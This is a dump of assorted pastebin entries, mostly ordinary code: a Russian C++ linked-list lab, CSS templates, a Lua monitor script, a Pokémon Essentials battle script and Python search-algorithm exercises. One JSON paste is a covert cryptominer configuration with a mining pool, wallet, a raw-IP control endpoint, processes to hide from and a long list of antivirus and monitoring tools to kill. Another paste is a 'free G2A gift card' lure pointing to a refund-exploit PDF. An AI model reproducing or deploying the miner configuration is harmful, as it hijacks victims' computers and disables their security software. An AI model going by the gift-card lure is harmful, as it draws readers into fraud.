id,title,username,language,date,content
5LVdtVB8,lab 10,SillyWolfy,C++,Monday 13th of May 2024 12:46:36 AM CDT,"#define NOMINMAX
#include <windows.h>
#include <iostream>
#include <string>
#include <limits>
using namespace std;

template<typename T>
struct Node {
    T data;
    Node* next;

    Node(T val) : data(val), next(nullptr) {}
};

template<typename T>
class LinkedList {
private:
    Node<T>* head;

public:
    LinkedList() : head(nullptr) {}
    void push_back(T value) {
        Node<T>* newNode = new Node<T>(value);
        if (head == nullptr) {
            head = newNode;
        }
        else {
            Node<T>* temp = head;
            while (temp->next != nullptr) {
                temp = temp->next;
            }
            temp->next = newNode;
        }
    }
    void remove_at(int position) {
        Node<T>* temp = head;
        if (position == 0) {
            head = head->next;
            delete temp;
            return;
        }
        for (int i = 0; temp != nullptr and i < position - 1; ++i) {
            temp = temp->next;
        }
        Node<T>* nodeToDelete = temp->next;
        temp->next = temp->next->next;
        delete nodeToDelete;
    }
    void print() const {
        Node<T>* temp = head;
        while (temp != nullptr) {
            temp->data.print();
            cout << '\n';
            temp = temp->next;
        }
    }
    int size() const {
        int count = 0;
        Node<T>* temp = head;
        while (temp != nullptr) {
            count++;
            temp = temp->next;
        }
        return count;
    }
    T& get(int index) {
        Node<T>* temp = head;
        for (int i = 0; temp != nullptr and i < index; ++i) {
            temp = temp->next;
        }
        return temp->data;
    }
    ~LinkedList() {
        Node<T>* current = head;
        Node<T>* nextNode;
        while (current != nullptr) {
            nextNode = current->next;
            delete current;
            current = nextNode;
        }
    }
};

class Product
{
public:
    Product();
    Product(string namee, int weightt, int pricee, int lifee) {
        this->name = namee;
        this->weight = weightt;
        this->price = pricee;
        this->life = lifee;
    }
    void print() const {
        cout << ""Название продукта: "" << this->name << '\n'
            << ""Вес продукта: "" << this->weight << '\n'
            << ""Цена продукта: "" << this->price << '\n'
            << ""Срок годности продукта: "" << this->life << '\n';
        if (life <= 2) {
            cout << ""Данный товар идёт по уценке!\n"";
        }
    }
    string get_name() const {
        return this->name;
    }
private:
    string name;
    int weight;
    int price;
    int life;
};

void add_product(LinkedList<Product>& database) {
    cout << ""\tДобавление продукта в список\n"";
    cin.ignore(numeric_limits<streamsize>::max(), '\n');
    cout << ""Введите название продукта: "";
    string name;
    getline(cin, name);
    cout << '\n';
    cout << ""Введите вес продукта: "";
    int weight;
    while (true) {
        cin >> weight;
        if (cin.fail() or weight <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
        }
        else {
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            break;
        }
    }
    cout << '\n';
    cout << ""Введите цену продукта: "";
    int price;
    while (true) {
        cin >> price;
        if (cin.fail() or price <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
        }
        else {
            break;
        }
    }
    cout << '\n';
    cout << ""Введите срок годности продукта в днях продукта: "";
    int life;
    while (true) {
        cin >> life;
        if (cin.fail() or life <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
        }
        else {
            break;
        }
    }
    database.push_back(Product(name, weight, price, life));
}

void delete_product(LinkedList<Product>& database, int index) {
    database.remove_at(index - 1);
}

int main()
{
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    setlocale(LC_ALL, ""Russian"");
    LinkedList<Product> DateBase;
    while (true) {
        cout << ""\tMeню\n"";
        cout << ""Необходимо выбрать один из пунктов:\n"";
        cout << ""1) Добавить продукт в список\n"";
        cout << ""2) Удалить продукт из списка\n"";
        cout << ""3) Вывести список\n"";
        cout << ""4) Закончить программу\n"";
        cout << ""Введите номер необходимого пункта: "";
        int choice;
        while (true) {
            cin >> choice;
            if (cin.fail() or choice <= 0) {
                cin.clear();
                cin.ignore();
                cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
            }
            else {
                break;
            }
        }
        switch (choice) {
        case 1: {
            system(""cls"");
            add_product(DateBase);
            system(""pause"");
            system(""cls"");
            break;
        }
        case 2: {
            system(""cls"");
            int dbSize = DateBase.size();
            if (dbSize == 0) {
                cout << ""В вашем списке ничего нет!\n"";
                system(""pause"");
                system(""cls"");
                break;
            }
            for (int i = 0; i < dbSize; ++i) {
                cout << i + 1 << "". "" << DateBase.get(i).get_name() << '\n';
            }
            cout << ""Введите индекс продукта, который нужно удалить: "";
            int index;
            while (true) {
                cin >> index;
                if (cin.fail() or index <= 0 or index > dbSize) {
                    cin.clear();
                    cin.ignore();
                    cout << ""Некорректный ввод. Пожалуйста, введите число из доступного диапазона: "";
                }
                else {
                    break;
                }
            }
            delete_product(DateBase, index);
            system(""pause"");
            system(""cls"");
            break;
        }
        case 3: {
            system(""cls"");
            if (DateBase.size() == 0) {
                cout << ""В вашем списке ничего нет!\n"";
                system(""pause"");
                system(""cls"");
                break;
            }
            DateBase.print();
            system(""pause"");
            system(""cls"");
            break;
        }
        case 4: {
            return 0;
        }
        default:
            system(""cls"");
            break;
        }
    }
}
"
JFCDeKwC,TestingM,tarekxx,JSON,Monday 13th of May 2024 12:34:55 AM CDT,"{
    ""algo"": ""rx/0"",
    ""pool"": ""zeph-eu1.nanopool.org"",
    ""port"": 10943,
    ""wallet"": ""ZEPHs787ivBXAw2CUxSkCYBDey6SE8bgD7dgWYLS94reSxSkkytU97eTyx33LQGUdbEueLWTHKEdnYwQi5oVNWMQ5ULrHk6i9P9.XZXZXZX/mypassword1234"",
    ""ssltls"": true,
    ""max-cpu"": 20,
    ""idle-wait"": 1,
    ""idle-cpu"": 80,
    ""stealth-targets"": ""ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"",
    ""kill-targets"": ""Taskmgr.exe,zerotier-one_x64.exe,xmsdiag.exe,afwServ.exe,aswEngSrv.exe,aswidsagent.exe,aswToolsSvc.exe,AvastSvc.exe,AvastSvc.exe,AvastUI.exe,wsc_proxy.exe,AvastBrowser.exe,AvastNM.exe,ashwebsv.exe,aswupdsv.exe,kavfswp.exe,kavtray.exe,kavfsmui.exe,kavshell.exe,kavfsrcn.exe,kavfs.exe,kavfsgt.exe,kavfswh.exe,kavfsscs.exe,efpeadm.exe,VPNGUI.exe,CVPND.exe,IPSECLOG.exe,cfp.exe,fsdfwd.exe,fsguiexe.exe,blackd.exe,kpf4gui.exe,MSSCLL.exe,MCSHELL.exe,MPFSERVICE.exe,MPFAGENT.exe,nisum.exe,smc.exe,persfw.exe,pccpfw.exe,WINSS.exe,ZLCLIENT.exe,MCODS.exe,MCSHIELD.exe,msmpeng.exe,navapsvc.exe,avkwctl.exe,fsav32.exe,mcshield.exe,ntrtscan.exe,avguard.exe,ashServ.exe,AVENGINE.exe,avgemc.exe,tmntsrv.exe,advchk.exe,ahnsd.exe,alertsvc.exe,avmaisrv.exe,avsynmgr.exe,bitdefender_p2p_startup.exe,cavrid.exe,cavtray.exe,cmgrdian.exe,freshclam.exe,icepack.exe,mgavrtcl.exe,mghtml.exe,mgui.exe,navapsvc.exe,navapw32.exe,navw32.exe,nsmdtr.exe,ofcdog.exe,pav.exe,savscan.exe,spider.exe,xcommsvr.exe,Procmon64a.exe,Procmon64.exe,Procmon.exe,anvir.exe,MRT.exe"",
	""stealth-fullscreen"": true,
	""api-endpoint"": ""http://156.208.133.221:8080/api/endpoint.php?key=UnknownErrors""
}"
UXc6QQL9,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Monday 13th of May 2024 12:15:04 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_212687.pdf

Working as of:
13 May 2024"
Qm2EZQU7,𝐒𝐄𝐕𝐄𝐍,wilderanima,CSS,Monday 13th of May 2024 12:00:57 AM CDT,"     Hello, wildlings! 
 
  A straightforward placeholder code with an image and a scrolling words box. 
  Follow the dimensions of the images, otherwise, they won't fit properly. 
  Feel free to change colors! 
 
  Please do not steal this code. 
  Leave the credit! <3 Happy Writing! 
 
— — — — — — — — — — — — — — 

<style>

@import url('https://fonts.googleapis.com/css2?family=Economica:ital,wght@0,400;0,700;1,400;1,700&display=swap');

body {
cursor: url(https://66.media.tumblr.com/232c090ebdd37ae4bc17adb54e1e0344/tumblr_inline_ol4nwhvSwg1uxxza6_1280.png), auto;
background-color: #000;
}

::-webkit-scrollbar {
display: none;
}

::selection {
background: ;
color: white;
}

.container {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 0px;
right: 0px;
height: 550px;
width: 550px;
background-color: #000;
}

.wilder {
position: fixed;
bottom: 0px;
right: 0px;
}

.image1 {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 0px;
right: 250px;
height: 400px;
width: 250px;
background: url(https://placehold.co/250x400.png);
background-size: cover;
outline: 1px solid #554136;
outline-offset: -5px;
}

.words {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 275px;
right: 0px;
height: 355px;
width: 250px;
font: 12px economica;
color: #a3a597;
text-align: center;
overflow: auto;
}
b {
font: 13px economica;
color: #554136;
text-transform: uppercase;
font-weight: bold;
}
i {
font: 13px economica;
font-style: italic;
color: #7a6d65;
}
a {
text-decoration: none;
font: 13px times;
color: #7a6d65;
transition: 0.5s;
}
a:hover {
color: #a3a597;
text-shadow: 1px 1px 0px #7a6d65;

</style>

<!--
 MUSIC PLAYER #02 by glenthemes
 ♬ glenthpvs.tumblr.com/player02
--->
<script src=""//cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js""></script>
<link href=""//fonts.googleapis.com/css?family=Readex+Pro"" rel=""stylesheet"">
<link href=""//glenthemes.github.io/-music-/glenplayer02.css"" rel=""stylesheet"">
<script src=""//glenthemes.github.io/-music-/glenplayer02.js""></script>
<style element=""glenplayer02"">
:root {
 --MusicPlayer-Position:bottom left;
 --MusicPlayer-Edge-Offset:15px;
 
 --MusicPlayer-Buttons-Size:14px;
 --MusicPlayer-Buttons-Color:#554136;
 --MusicPlayer-Buttons-Fill:yes;

}
</style>

<div glenplayer02>
<div controls></div>
<i class=""aa-line-icons"" icon-name=""music-2""></i>
<audio src=""MUSIC_LINK"" volume=""100%""></audio>
</div>

<div class=""wilder""><a target=""_blank"" href=""https://pastebin.com/u/wilderanima"" title=""code by wilder.""><img src=""https://i.imgur.com/hCJmFVu.png"" width=""75px;""></a></div>

<div class=""container"">
<div class=""image1""></div>
<div class=""words"">

<b>let's try something bold.</b> <br>
<i>how about something italic?</i> <br>
<a>and for good measure? a link.</a> <br><br>

lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. <br><br>

ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. <br><br>

duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. <br><br>

excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. <br><br>

<hr size=""1"" width=""100%"" noshade style=""color:#554136""/>
<br>

words. <br><br>

</div>
</div>"
z0rnHH0Y,CC: GhoulMonitor,deadinside1222,Lua,Sunday 12th of May 2024 11:27:22 PM CDT,"local monitor = peripheral.find(""monitor"")

if monitor then
    
    monitor.clear()
    monitor.setCursorPos(1,1)

    
    local i = 1000

    
    while true do
        monitor.clear()     
        monitor.write(tostring(i))
        i = i - 7     
        if i < 0 then
            i = 1000
        end
        
        
        sleep(0.5)
    end
else
    print(""ERROR"")
end"
3KRELrGj,Online Trainer v21,FiaPlay,Ruby,Sunday 12th of May 2024 11:03:15 PM CDT,"#-----------------------------------------------------------------------------
# Script creado por FiaPlay para Pokémon Essentials BES. Créditos si se usa.
# Discord de FP Systems: https://discord.gg/ds8DWB5NSW
# Si vas reportar algún bug o preguntar algo recomiendo hacerlo en el hilo del server de PokeLiberty o en FP Systems.
#-----------------------------------------------------------------------------
# Demostración
#-----------------------------------------------------------------------------
# Modo de uso:
# *Usa fpDownloadBattle para descargar los datos de la batalla
# *Usa OnlineBattle.start() para iniciar la batalla
# ****Los siguientes pasos no deben hacerse en la versión que los jugadores descargarán****
# *Crea una copia de tu juego para generar los datos
# *Usa el modo depurador para dejar tu equipo igual al que quieres para el entrenador.
# *Usa OnlineBattle.new(trtype,trname,doublebattle,endspeech)
# trtype es el ID del tipo de entrenador
# trname es el nombre del entrenador
# doublebattle indica si será un combate doble
# endspeech es lo que dirá el entrenador al terminar el combate
# battle_rules un array con las battle rules activas
# items un array con los objetos del rival
# Eso creará el archivo OnlineBattle.txt en la capeta del juego.
# Sube el contenido de OnlineBattle.txt a internet (recomendable pastebin.com)
=begin Para un ejemplo de como generar el combate:
r=[""2v2"",[""weather"",:Rain]]
OnlineBattle.new(:LEADER_Brock, ""Koga"",false,""Buena Pelea."",r)
=end

#-----------------------------------------------------------------------------
URRL = ""https://pastebin.com/raw/YLYPMEVK"" # Enlace a el txt con los datos encriptados.
BATTLE_BGM = """" # BGM usado para la batalla (si se deja en blanco se usará la música por defecto del entrenador)
class OnlineBattle
  attr_accessor :trainer
  attr_accessor :team
  attr_accessor :doublebattle
  attr_accessor :endspeech
  attr_accessor :rules
  attr_accessor :items

  def initialize(trtype,trname,doublebattle=false,endspeech="""",battle_rules=[],items=[])
    @team = $player.party
    @trainer = NPCTrainer.new(trname,trtype)
    @doublebattle = doublebattle
    @trainer.lose_text = endspeech
    @rules     = battle_rules
    text=pbMysteryGiftEncrypt(self)
    $PokemonGlobal.downloaded_battle=text
    File.open(""OnlineBattle.txt"",""wb""){|f|
       f.write(text)
      }
  end

#===============================================================================
# Trainer battles
#===============================================================================
  def self.start(var=1)
    b=fpLoadDownloandedBattle
    if !b
      pbMessage(""No se han podido cargar los datos de la batalla"")
      return
    end
    for i in b.rules
      if i.is_a?(Array)
        setBattleRule(i[0],i[1])
      else
        setBattleRule(i)
      end
    end
    outcome_variable = $game_temp.battle_rules[""outcomeVar""] || var
    can_lose         = $game_temp.battle_rules[""canLose""] || false
    # Skip battle if the player has no able Pokémon, or if holding Ctrl in Debug mode
    if BattleCreationHelperMethods.skip_battle?
      return BattleCreationHelperMethods.skip_battle(outcome_variable, true)
    end
    # Record information about party Pokémon to be used at the end of battle (e.g.
    # comparing levels for an evolution check)
    EventHandlers.trigger(:on_start_battle)
    # Generate information for the foes
    foe_trainers = [b.trainer]
    foe_items = []
    foe_party = b.team
    # Generate information for the player and partner trainer(s)
    player_trainers, ally_items, player_party, player_party_starts = BattleCreationHelperMethods.set_up_player_trainers(foe_party)
    # Create the battle scene (the visual side of it)
    scene = BattleCreationHelperMethods.create_battle_scene
    # Create the battle class (the mechanics side of it)
    battle = Battle.new(scene, player_party, foe_party, player_trainers, foe_trainers)
    battle.party1starts = player_party_starts
    battle.party2starts = [0]
    battle.ally_items   = ally_items
    battle.items        = foe_items
    # Set various other properties in the battle class
    setBattleRule(""#{foe_trainers.length}v#{foe_trainers.length}"") if $game_temp.battle_rules[""size""].nil?
    BattleCreationHelperMethods.prepare_battle(battle)
    $game_temp.clear_battle_rules
    # Perform the battle itself
    outcome = 0
    pbBattleAnimation(pbGetTrainerBattleBGM(foe_trainers), (battle.singleBattle?) ? 1 : 3, foe_trainers) do
      pbSceneStandby { outcome = battle.pbStartBattle }
      BattleCreationHelperMethods.after_battle(outcome, can_lose)
    end
    Input.update
    # Save the result of the battle in a Game Variable (1 by default)
    BattleCreationHelperMethods.set_outcome(outcome, outcome_variable, true)
    return outcome
  end
end

def fpDownloadBattle()
  text = pbDownloadToString(URRL)
  if text.length>0
    $PokemonGlobal.downloaded_battle=text
  end
end

def fpLoadDownloandedBattle
  text=$PokemonGlobal.downloaded_battle
  return false if !text || text.length==0
  b=Marshal.restore(Zlib::Inflate.inflate(text.unpack(""m"")[0]))
  return b
end

class PokemonGlobalMetadata
  attr_accessor :downloaded_battle
end

def pbGetTrainerBattleBGM(trainer,online=false)
  pbStringToAudioFile(BATTLE_BGM) if online && BATTLE_BGM.length>0
  return $PokemonGlobal.nextBattleBGM.clone if $PokemonGlobal.nextBattleBGM
  ret = nil
  music = nil
  trainerarray = (trainer.is_a?(Array)) ? trainer : [trainer]
  trainerarray.each do |t|
    trainer_type_data = GameData::TrainerType.get(t.trainer_type)
    music = trainer_type_data.battle_BGM if trainer_type_data.battle_BGM
  end
  ret = pbStringToAudioFile(music) if music && music != """"
  if !ret
    # Check map metadata
    music = $game_map.metadata&.trainer_battle_BGM
    ret = pbStringToAudioFile(music) if music && music != """"
  end
  if !ret
    # Check global metadata
    music = GameData::Metadata.get.trainer_battle_BGM
    ret = pbStringToAudioFile(music) if music && music != """"
  end
  ret = pbStringToAudioFile(""Battle trainer"") if !ret
  return ret
end
"
aJDKNH7s,Meta,tinn01,GetText,Sunday 12th of May 2024 10:58:47 PM CDT,"S-1-5-21-1193083378-3124615022-3272316965-1002 - me
S-1-5-21-2828353685-3820469404-3474401707-1000 - gojo // 6 - 13 "
5R6S482L,Series (Biram),AhmadXploit,Dart,Sunday 12th of May 2024 10:50:11 PM CDT,"{
  ""series"": [
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    }
  ]
}"
3fnNrdxu,Untitled,AbsolutelyS,C++,Sunday 12th of May 2024 10:47:24 PM CDT,"/*
 * Towers of Hanoi
 */

void move(int disk, char source, char destination) {
    cout << ""Move disk "" << disk << "" from rod "" << source << "" to rod "" << destination << endl;
}

void towersOfHanoi(int n, char source, char destination, char auxiliary) {
    if (n == 1) {
        move(n, source, destination);
        return;
    }

    towersOfHanoi(n - 1, source, auxiliary, destination);
    move(n, source, destination);
    towersOfHanoi(n - 1, auxiliary, destination, source);
}"
6z4MJLqS,Untitled,Hend_Sayed,Python,Sunday 12th of May 2024 10:46:03 PM CDT,"#eightpuzzle

from tkinter import *
from tkinter import messagebox
import random
import copy
import time

#    init:      goal:
#    7 2 4      0 1 2
#    5 0 6      3 4 5
#    8 3 1      6 7 8

_goal_state = '012345678'
_init_state = '724506831'

# neighbors of each square
_neighbors = {0: [1,3],
              1: [0,2,4],
              2: [1,5],
              3: [0,4,6],
              4: [1,3,5,7],
              5: [2,4,8],
              6: [3,7],
              7: [4,6,8],
              8: [5,7]}

# Manhattan Distances from any square to another
_distance = [[0,1,2,1,2,3,2,3,4],
             [1,0,1,2,1,2,3,2,3],
             [2,1,0,3,2,1,4,3,2],
             [1,2,3,0,1,2,1,2,3],
             [2,1,2,1,0,1,2,1,2],
             [3,2,1,2,1,0,3,2,1],
             [2,3,4,1,2,3,0,1,2],
             [3,2,3,2,1,2,1,0,1],
             [4,3,2,3,2,1,2,1,0]]


_algo = {1:""Breadth-First Search"", 
        2:""Iterative Deepening Search"",
        3:""A* Search"", 
         }

class EightPuzzle(object):

    def __init__(self, input_state=None):
        if input_state:
            self.state = copy.deepcopy(input_state)
        else:       
            # generate a solvable state randomly
            self.state = copy.deepcopy(_goal_state)
            self.shuffle()
            
    # shuffle the current state
    def shuffle(self):
        pos0 = self.state.index('0')
        for i in range(100):
            choices = _neighbors[pos0]
            pos = choices[random.randint(0, len(choices)-1)]
            self.swap(pos)
            pos0 = self.state.index('0')

        # # generate a 8-puzzle problem with 1/2 chance to be unsolvable
        # l = list('012345678')
        # random.shuffle(l)
        # self.state = ''.join(l)

    # swap 0 with its neighbor pos
    def swap(self, pos):
        pos0 = self.state.index('0')
        l = list(self.state)
        l[pos0], l[pos] = l[pos], l[pos0]
        self.state = ''.join(l)

    # get all the possible next states
    def get_next(self, current):
        pos0 = current.index('0')
        nextStates = []

        for pos in _neighbors[pos0]:
            l = list(current)
            l[pos0], l[pos] = l[pos], l[pos0]
            step = ''.join(l)
            nextStates.append(step)
        return nextStates  

    # BFS algorithm
    def solve_by_BFS(self):

        root = self.state
        goal = '012345678'
        previous = {root: None}
        visited = {root: True}
        solved = (root == goal)
        q = [root]
        while q and not solved:
            current = q.pop(0)
            for next_node in self.get_next(current):
                if not next_node in visited:
                    visited[next_node] = True
                    previous[next_node] = current
                    q.append(next_node)
                if next_node == goal:
                    solved = True
                    break
        
        # return shortest path and number of states explored
        if solved:
            return self.retrieve_path(goal, previous), len(visited)
        return None, len(visited)


    # Iterative Deepening search algorithm
    def solve_by_IDS(self):

        # DFS with depth limit
        def explore(current, depth):
            nonlocal goal, solved, limit
            if current == goal:
                solved = True
                return
            if depth >= limit:
                return
            next_depth = depth+1
            for next_node in self.get_next(current):
                if not next_node in visited:
                    visited[next_node] = True
                    previous[next_node] = current
                    if not next_depth in level:
                        level[next_depth] = []
                    level[next_depth].append(next_node)
                    explore(next_node, next_depth)
                if solved:
                    break

        root = self.state
        goal = '012345678'
        previous = {root: None}
        visited = {root: True}
        level = {0:[root]}
        solved = (root == goal)
        limit = 0
        while not solved and limit in level:
            depth = limit
            limit += 1
            for node in level[depth]:
                explore(node, depth)

        if solved:
            return self.retrieve_path(goal, previous), len(visited)
        return None, len(visited)


    # A* algorithm
    def solve_by_Astar(self, method):

        class Node(object):
            def __init__(self, state):
                self.state = state
                self.g = 100000
                self.h = 100000
            def __str__(self):
                return self.state
            def f(self):
                return self.g+self.h
            def heuristic(self, method):
                goal = '012345678'
                count = 0
                if method == 1: # misplaced tiles
                    for i in range(9):
                        if self.state[0] != goal[0]:
                            count += 1
                else:   # Manhattan distance
                    for i in range(9):
                        pos = goal.index(self.state[i])
                        count += _distance[pos][i]
                self.h = count

        root = Node(self.state)
        root.g = 0
        root.heuristic(method)
        goal = '012345678'
        previous = {str(root): None}
        visited = {str(root): True}
        solved = (str(root) == goal)
        q = {root.f():[root]}

        while not solved and q:
            # pop from the min-queue
            try:
                i = min(q)
            except Exception as e:
                continue
            try:
                current = q[min(q)].pop()
            except Exception as e:
                del q[min(q)]
                continue
            
            visited[str(current)] = True
            for temp in self.get_next(str(current)):
                if temp in visited:
                    continue
                node = Node(temp)
                if node.g > current.g+1:
                    node.g = current.g+1
                    previous[temp] = str(current)
                node.heuristic(method)
                if not node.f() in q:
                    q[node.f()] = []
                q[node.f()].append(node)

                if temp == goal:
                    solved = True
                    break

        if solved:
            return self.retrieve_path(goal, previous), len(visited)
        return None, len(visited)

    # retrieve the shortest path
    def retrieve_path(self, goal, previous):
        path = [goal]
        current = goal
        while previous[current]:
            path.insert(0, previous[current])
            current = previous[current]
        return path


puzzle = EightPuzzle(_init_state)

# display the current puzzle state 
def display():
    color = 'DeepPink' if puzzle.state != _goal_state else 'green'

    for i in range(9):
        if puzzle.state[i] != '0':
            var[i].set(str(puzzle.state[i]))
            label[i].config(bg=color)
        else:
            var[i].set('')
            label[i].config(bg='white')

# solve 8-puzzle using specific algorithm
def solve():
    for b in button:
        b.configure(state='disabled')
    option.configure(state='disabled')

    run = {1: puzzle.solve_by_BFS,
        2: puzzle.solve_by_IDS,
        3: lambda:puzzle.solve_by_Astar(1)}

    temp = select.get()
    index = 1
    for k,e in _algo.items():
        if e == temp:
            index = k
            break
    
    print('Solving...')
    
    # get solving time
    stime = time.time()
    path, n = run[index]()
    ttime = time.time()

    # if 8-puzzle is unsolvable
    if not path:    
        print('This 8-puzzle is unsolvable!')
        for i in range(9):
            label[i].config(bg='red' if puzzle.state[i] != '0' else 'white')
        for b in button:
            b.configure(state='normal')
        option.configure(state='normal')
        return

    info = 'Algorithm: '+_algo[index]+'\n' \
         + 'Time: '+str(round(ttime-stime, 6))+'s\n' \
         + 'States Explored: '+str(n)+'\n' \
         + 'Shortest Path: '+str(len(path)-1)+' steps.'
    print(info)
    display_procedure(path)    

# demonstrate the shortest path
def display_procedure(path):
    if not path:
        for b in button:
            b.configure(state='normal')
        option.configure(state='normal')
        return
    puzzle.state = path.pop(0)
    display()
    win.after(500, lambda: display_procedure(path)) 

# shuffle the state
def shuffle():
    puzzle.shuffle()
    display()

# reset to the initial state
def reset():
    puzzle.state = copy.deepcopy(_init_state)
    display()

# move with mouse clicking
def move(event):
    text = event.widget.cget('text')
    if not text:
        return
    
    pos = puzzle.state.index(text)
    pos0 = puzzle.state.index('0')
    if _distance[pos0][pos] > 1:
        return

    puzzle.swap(pos)
    display()

#
# Set up of Basic UI
#
win = Tk()
win.geometry('+300+100')
win.title('8-Puzzle')
algoFrame = Frame(win, width=260, relief=RAISED)
algoFrame.pack()
select = StringVar(algoFrame)
select.set(_algo[1]) # default value
option = OptionMenu(algoFrame, select, _algo[1], _algo[2], _algo[3])
option.pack()
board = Frame(win, width=260, height=260, relief=RAISED)
board.pack()
var = [StringVar() for i in range(9)]
label = [Label(board, textvariable=var[i], bg='gray', font=('Calibri', 48)) for i in range(9)]
for i in range(3):
    for j in range(3):
        label[i*3+j].bind(""<Button-1>"", lambda event: move(event))
        label[i*3+j].place(x=85*j+5,y=85*i+5, width=80, height=80)
        
buttonFrame = Frame(win, relief=RAISED, borderwidth=1)
buttonFrame.pack(fill=X, expand=True)
button = []
button.append(Button(buttonFrame, width='8', relief=RAISED, text=""Reset"", command=reset))
button.append(Button(buttonFrame, width='8', relief=RAISED, text=""Random"", command=shuffle))
button.append(Button(buttonFrame, width='8', relief=RAISED, text=""Solve"", command=solve)) # to be initialized
for b in button:
    b.pack(side=LEFT, padx=5, pady=7)


# initialization of the game
def main():
    display()
    win.mainloop()

if __name__ == ""__main__"":
    main()
"
FB3GgCSk,Untitled,Hend_Sayed,Python,Sunday 12th of May 2024 10:44:19 PM CDT,"#AI ALGORISMS 

#1-BFS

#declaring the graph as a dictionary
graph = {
  'S' : [ 'A','B','D'],
  'A' : ['C'],
  'B' : ['D'],
  'C' : ['D','G'],
  'D' : ['G'],
  'G' : []
}
def bfs(graph, start, goal):
    #create a list to store the visited nodes and a queue to store the nodes
    visited = []
    queue = [[start]]
    
    #loop through the queue if it's not empty
    while queue:
        path = queue.pop(0) #remove from the left
        node = path[-1]

        if node == visited:
            continue
        visited.append(node)
        if node == goal:
            return path
        else:
            adjacent_nodes = graph.get(node, [])
            for adjacent_node in adjacent_nodes:
                new_path = path.copy()
                new_path.append(adjacent_node)
                queue.append(new_path)
    return print(""The queue is empty, no solution found."")

solution = bfs(graph,'S','G')
print('Solution is ' , solution)


#2-DFS

#declaring the graph as a dictionary
graph = {
  'S' : [ 'A','B','D'],
  'A' : ['C'],
  'B' : ['D'],
  'C' : ['D','G'],
  'D' : ['G'],
  'G' : []
}
def dfs(graph, start, goal):
    #create a list to store the visited nodes and a stack to store the nodes
    visited = []
    stack = [[start]]
    
    #loop through the stack if it's not empty
    while stack:
        path = stack.pop() #remove from the right
        node = path[-1]

        if node == visited:
            continue
        visited.append(node)
        if node == goal:
            return path
        else:
            adjacent_nodes = graph.get(node, [])
            for adjacent_node in adjacent_nodes:
                new_path = path.copy()
                new_path.append(adjacent_node)
                stack.append(new_path)
    return print(""The stack is empty, no path found."")

solution = dfs(graph,'S','G')
print('Solution is ' , solution)


#3-AlphaBeta
import math

def alpha_beta_minimax(cd, node, alpha, beta, maxt, scr, td):
    if cd == td:
        return scr[node]
    if maxt:
        v = -math.inf
        for child in [node*2, node*2+1]:
            v = max(v, alpha_beta_minimax(cd+1, child, alpha, beta, False, scr, td))
            alpha = max(alpha, v)
            if alpha >= beta:
                break
        return v
    else:
        v = math.inf
        for child in [node*2, node*2+1]:
            v = min(v, alpha_beta_minimax(cd+1, child, alpha, beta, True, scr, td))
            beta = min(beta, v)
            if alpha >= beta:
                break
        return v

scr = []
x = int(input('Enter Total Number of leaf nodes: '))
for i in range(x):
    y = int(input('Enter leaf value: '))
    scr.append(y)

td = math.log(len(scr), 2)
cd = int(input('Enter current depth value: '))
nodev = int(input('Enter node value: '))
alpha = -math.inf
beta = math.inf
maxt = True


answer = alpha_beta_minimax(cd, nodev, alpha, beta, maxt, scr, td)
print('The answer is: ',answer)

#4-GBS

